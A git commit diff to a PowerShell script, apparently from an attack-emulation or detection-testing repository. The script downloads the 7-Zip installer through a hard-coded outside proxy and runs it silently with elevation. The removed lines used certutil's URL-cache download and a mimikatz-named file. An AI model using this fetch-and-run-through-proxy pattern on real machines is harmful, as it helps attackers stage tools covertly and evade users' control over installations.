efadbd2e4dc28161dc7e7549768d6dbce72a5a99
tameval <114147355+tameval@users.noreply.github.com>
2022-10-22 18:09:28 +0900

    Update unzip_124509pr.ps1

--- 124509/proxy/unzip_124509pr.ps1
+++ 124509/proxy/unzip_124509pr.ps1
@@ -1,4 +1,3 @@
-Invoke-WebRequest "https://7-zip.org/a/7z2201-x64.exe" -Proxy "13.231.199.128:3128" -Headers $headers -OutFile $env:TEMP\enc_mimikatz.zip
-C:\Windows\System32\Certutil.Exe -Urlcache -Split -F https://7-zip.org/a/7z2201-x64.exe $env:TEMP\7z.Exe
+Invoke-WebRequest "https://7-zip.org/a/7z2201-x64.exe" -Proxy "13.231.199.128:3128" -Headers $headers -OutFile $env:TEMP\7z.Exe
 Start-Process -FilePath $env:TEMP\7z.Exe -Args "/S" -Verb RunAs -Wait
 Remove-Item $env:TEMP\7z.Exe
